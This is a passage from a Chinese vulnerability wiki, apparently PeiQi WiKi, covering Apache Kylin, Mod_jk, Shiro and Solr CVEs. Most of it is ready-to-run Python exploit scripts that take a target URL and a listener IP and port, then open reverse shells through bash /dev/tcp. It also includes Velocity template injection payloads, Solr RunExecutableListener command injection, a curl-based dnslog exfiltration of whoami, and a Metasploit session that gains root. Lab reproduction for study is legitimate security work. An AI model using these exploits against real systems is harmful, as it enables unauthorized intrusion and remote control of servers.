\"project=null;JSESSIONID=\"+cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] 成功将\" + key[i] +\"设置为\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] 设置\" + key[i] +\"为\" + value[i] +\"失败\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) def POC_3(target_url, cookie): print(\"\\033[35m[o] 正在反弹shell......\\033[0m\") vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.post(url=vuln_url, headers=headers) POC_4(target_url, cookie) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) def POC_4(target_url, cookie): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\", \"kylin.tool.auto-migrate-cube.src-config\", \"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"flase\", \"echo;echo;echo\", \"None\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] 成功将\" + key[i] +\"设置为\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] 设置\" + key[i] +\"为\" + value[i] +\"失败\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) print(\"\\033[35m[o] 成功清理痕迹\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie,Authorization = POC_1(target_url) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_2(target_url, cookie, IP, PORT, Authorization) POC_3(target_url, cookie) 参考文章 Apache Kylin 命令注入漏洞 CVE-2020-1956 POC 分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin的未授权配置泄露.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin的未授权配置泄露.html","title":"Apache Kylin的未授权配置泄露","keywords":"","body":"Apache Kylin的未授权配置泄露 CVE-2020-13937 FOFA app=\"APACHE-kylin\" 受影响的版本： Apache Kylin 有一个restful api会在没有认可认证的情况下暴露配置信息。 Kylin 2.x.x Kylin Kylin 4.0.0-alpha 漏洞利用 根据漏洞情报 漏洞利用POC为http://xxx.xxx.xxx.xxx/kylin/api/admin/config 漏洞检测POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin 2.x.x >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"config\" in response.text: print(\"\\033[32m[o] 存在Apache Kylin的未授权配置泄露\\n[o] 响应为:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 参考 CVE-2020-13937|Apache Kylin的未授权配置泄露漏洞，腾讯安全全面支持检测 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Mod_jk/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Mod_jk/","title":"Apache Mod Jk","keywords":"","body":"Apache Mod_jk Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Mod_jk/Apache Mod_jk 访问控制权限绕过 CVE-2018-11759.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Mod_jk/Apache Mod_jk 访问控制权限绕过 CVE-2018-11759.html","title":"Apache Mod_jk 访问控制权限绕过 CVE-2018-11759","keywords":"","body":"Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 漏洞描述 Apache Tomcat JK（mod_jk）Connector是美国阿帕奇（Apache）软件基金会的一款为Apache或IIS提供连接后台Tomcat的模块，用以为Apache或IIS服务器提供处理JSP/Servlet的能力。 由于httpd和Tomcat在路径处理规范上存在差异，因此可以绕过Apache mod_jk Connector 1.2.0版本到1.2.44版本上由JkMount httpd指令所定义端点的访问控制限制。 如果一个只有只读权限的jkstatus的接口可以访问的话，那么就有可能能够公开由mod_jk模块给AJP提供服务的内部路由。 如果一个具有读写权限的jkstatus接口可供访问，我们就能通过修改AJP的配置文件中相关配置来劫持或者截断所有经过mod_jk的流量，又或者进行内部的端口扫描。 影响版本 [!NOTE] Apache Mod_jk Connector 1.2.0 ~ 1.2.44 环境搭建 git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d 访问 http://xxx.xxx.xxx.xxx:80 成功即可 漏洞复现 访问 http://xxx.xxx.xxx.xxx/jkstatus 显示无权限访问 Forbidden You don't have permission to access /jkstatus on this server. 访问 http://xxx.xxx.xxx.xxx/jkstatus; 即可绕过 [!NOTE] 注意是在url后面加上了一个; PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Shiro/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Shiro/","title":"Apache Shiro","keywords":"","body":"Apache Shiro Apache Shiro PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Shiro/Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Shiro/Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437.html","title":"Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437","keywords":"","body":"Apache Shiro 漏洞描述 Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。 影响版本 [!NOTE] Apache Shiro 漏洞环境 https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d 访问http://xxx.xxx.xxx.xxx:8080/login正常即可 漏洞复现 Shiro已经有比较完善的工具 https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 这里使用的是 ShiroExploit 工具进行复现 打开后输入url即可 成功反弹shell 参考文章 Shiro RememberMe 1.2.4远程代码执行漏洞-详细分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/","title":"Apache Solr","keywords":"","body":"Apache Solr Apache Solr RCE 远程执行漏洞 CVE-2019-0193 Apache Solr Velocity模板远程执行 CVE-2019-17558 Apache Solr 远程命令执行漏洞 CVE-2017-12629 Apache Solr XXE 漏洞 CVE-2017-12629 Apache Solr JMX服务 RCE CVE-2019-12409 Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html","title":"Apache Solr JMX服务 RCE CVE-2019-12409","keywords":"","body":"Apache Solr JMX服务 RCE CVE-2019-12409 漏洞描述 Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。 影响版本 [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 环境搭建 下载 Apache Solr 8.2.0 也可以docker搭建 docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 查看搭建的Solr是否存在漏洞,查看solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置是否为“Ture”，如果为Ture，则存在漏洞 查看漏洞端口18983是否开放 [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/桌面# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > set rhost 192.168.51.146 rhost => 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) > set rport 18983 rport => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -> 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id 用户id=0(root) 组id=0(root) 组=0(root) 漏洞修复 将solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置为false，然后重启Solr服务。 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html","title":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957","keywords":"","body":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 漏洞描述 在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。 影响版本 [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 环境搭建 选择一个存在漏洞的版本 下载各版本Solr地址 这里复现使用的是 Apache Solr 7.7.0 进行复现 下载后执行以下命令进行环境部署 cd solr-7.7.0 ./bin/solr start -e cloud -force 然后一路回车，直至出现 Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 在攻击机上下载目标版本的Solr,执行下列命令打包压缩文件 solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip 将 vuln.zip 进行上传 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] name参数为压缩包的文件名 利用漏洞创建一个 core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] name参数为创建的core核心名 collection.configName参数为上传的文件名 查看core列表，发现已经成功创建 再使用 Apache Solr Velocity模板远程执行 CVE-2019-17558 即可执行任意命令 POC使用详情参考另一篇复现文章 漏洞利用POC [!NOTE] 使用前按复现步骤上传对应版本的zip文件，例如我这里上传的文件为 qwert.zip,其他使用方法与 Apache Solr Velocity模板远程执行 CVE-2019-17558 的POC使用方法类似 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(Zip文件名) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] 创建Core失败 \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html","title":"Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629","keywords":"","body":"Apache Solr RCE 远程执行漏洞 CVE-2017-12629 漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。 影响版本 [!NOTE] Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d 漏洞复现 远程命令执行 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] 通过查看代码，能够触发命令执行的事件有两个：postCommit 和 newSearcher 使用 postCommit 第一个请求包用于载入缓存中 [!NOTE] exe : ping 执行的命令 dir: 命令存在的目录位置 args:命令参数 如下请求包执行的是 /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } 第二个请求包用于更新缓存并执行命令 POST /solr/demo/update HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] [!NOTE] 注意 第一个请求包的这个位置 \"name\":\"newlistener-1\", listerer的名字需要替换，例如第一次 为 newlistener-1 ，第二次则需要改为 newlistener-2 注意 第二个请求包的这个位置 [{\"id\":\"test\"}]， 同第一个请求包的name，每执行一次就需要更换 id ,例如第一次 为 test ，第二次则需要改为 tset-2 注意 Content-Type: application/json 需要添加 不更改执行发生报错示例 进入docker容器查看发现命令已经执行 使用 newSearcher 使用 newSearcher可以直接加载入缓存执行命令 请求包如下 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearcher\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[ \"-c\", \"mkdir /tmp/vuln\", ] } } [!NOTE] 注意点同上，也需要每次执行更改 \"name\":\"newlistener-2\" 的参数 成功执行了创建文件的命令 关于 如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行，请查看dnslog \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行 \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) [!NOTE] 如果shell或dnslog无反应，可以选择更改一下POC的部分参数执行需要的代码 参考文章 Apache Solr远程代码执行漏洞（CVE-2017-12629）从利用到入侵检测 cve-2017-12629 apache solr xxe & rce 漏洞分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html","title":"Apache Solr Velocity模板远程执行 CVE-2019-17558","keywords":"","body":"Apache Solr Velocity模板远程执行 CVE-2019-17558 漏洞描述 2019年10月末，GitHub代码中安全研究员S00pY发布一个Apache Solr Velocity模版注入远程命令执行的POC，发现网络上出现针对Apache Solr服务器的远程代码执行漏洞。该漏洞是由于Velocity模板存在注入所致（Velocity是一个基于Java的模板引擎，可让使用者通过模板语言引用Java中定义的对象）。攻击者在知道Solr服务器上Core名称后，先把params.resource.loader.enabled设置为true（就可加载指定资源），再进行远程执行命令。 影响版本 [!NOTE] Apache Solr 5.x 至 8.2.0 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 打开后获取 Core 信息 得知 test 这个 Core 存在 访问 http://xxx.xxx.xxx.xxx:8983/solr/test/config 正常 访问Core的config配置信息时，通过POST请求把params.resource.loader.enabled设置为 True，再通过精心构造的get请求即可RCE，此时用户就可以加载指定资源，构造一个能执行命令的恶意请求 设置params.resource.loader.enabled为True POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } 命令执行 再使用POC造成命令执行 